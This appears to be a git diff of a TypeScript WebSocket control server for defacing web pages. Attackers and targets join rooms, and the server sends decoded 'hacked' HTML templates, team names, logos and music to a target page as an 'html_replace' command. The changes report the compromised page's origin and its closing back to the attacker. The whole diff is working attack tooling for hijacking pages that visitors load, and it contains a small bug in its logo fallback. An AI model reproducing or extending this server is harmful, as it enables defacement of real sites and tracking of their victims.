@@ -20,21 +20,33 @@ const delay = (ms: number) => new Promise((res) => setTimeout(res, ms));
 function generateAttackHTML(fields: RoomField): string {
   const templateKey = fields.template_key;
   const templateBase64 = (templates as any)[templateKey];
-  
+
   if (!templateBase64) {
     console.error(`Template not found: ${templateKey}`);
     return "<h1>HACKED</h1><p>Your system has been compromised!</p>";
   }
-  
+
   // Decode template from base64
-  let htmlContent = Buffer.from(templateBase64, 'base64').toString('utf-8');
-  
+  let htmlContent = Buffer.from(templateBase64, "base64").toString("utf-8");
+
   // Replace placeholders with actual data
-  htmlContent = htmlContent.replace(/\[ATTACKER_NAME\]/g, fields.attacker_name || 'Anonymous');
-  htmlContent = htmlContent.replace(/\[MESSAGE_CONTENT\]/g, fields.message || 'Your system has been hacked!');
-  htmlContent = htmlContent.replace(/\[TEAM_NAMES\]/g, fields.teams?.join(' • ') || 'Unknown Team');
-  htmlContent = htmlContent.replace(/\[LOGO\]/g, fields.logo || '');
-  
+  htmlContent = htmlContent.replace(
+    /\[ATTACKER_NAME\]/g,
+    fields.attacker_name || "Anonymous"
+  );
+  htmlContent = htmlContent.replace(
+    /\[MESSAGE_CONTENT\]/g,
+    fields.message || "Your system has been hacked!"
+  );
+  htmlContent = htmlContent.replace(
+    /\[TEAM_NAMES\]/g,
+    fields.teams?.join(" • ") || "Unknown Team"
+  );
+  htmlContent = htmlContent.replace(
+    /\[LOGO\]/g,
+    `data:image/png;base64,${fields.logo}` || ""
+  );
+
   return htmlContent;
 }
 
@@ -95,7 +107,7 @@ websocket.on("connection", (ws: WebSocket) => {
     });
     console.log(`Attacker ${id} joined room ${path}`);
   };
-  const handleJoinTarget = () => {
+  const handleJoinTarget = (origin: string) => {
     targets.set(id, ws);
     const room = rooms.get(path);
     if (room) {
@@ -111,6 +123,7 @@ websocket.on("connection", (ws: WebSocket) => {
           JSON.stringify({
             event: "available",
             target_id: id,
+            origin,
           })
         );
       }
@@ -130,6 +143,18 @@ websocket.on("connection", (ws: WebSocket) => {
       const room = rooms.get(path);
       if (room) {
         room.is_target_close = true;
+        const attacker_id = room?.attacker_id;
+        if (attacker_id) {
+          const attacker_ws = attackers.get(attacker_id);
+          if (attacker_ws) {
+            attacker_ws.send(
+              JSON.stringify({
+                event: "target_close",
+                target_id: id,
+              })
+            );
+          }
+        }
       }
     }
   });
@@ -148,6 +173,7 @@ websocket.on("connection", (ws: WebSocket) => {
   interface Data {
     event: DataEvent;
     join_at?: DataJoinAt;
+    origin?: string;
     action?: Action; // only attacker side
     message?: Message;
   }
@@ -161,7 +187,7 @@ websocket.on("connection", (ws: WebSocket) => {
       if (data.join_at === "attacker") {
         handleJoinAttacker();
       } else if (data.join_at === "target") {
-        handleJoinTarget();
+        handleJoinTarget(data.origin as string);
       }
       return;
     }
@@ -179,17 +205,17 @@ websocket.on("connection", (ws: WebSocket) => {
           if (targetWs && targetWs.readyState === WebSocket.OPEN) {
             // Generate HTML from template and room configuration
             const htmlContent = generateAttackHTML(room.fields);
-            
+
             // Send HTML replacement command to target
             const htmlPayload = {
               event: "html_replace",
               html: htmlContent,
               music: room.fields.music || null,
             };
-            
+
             targetWs.send(JSON.stringify(htmlPayload));
             console.log(`Attack HTML sent to target ${room.target_id}`);
-            
+
             // Notify attacker of successful attack
             ws.send(
               JSON.stringify({
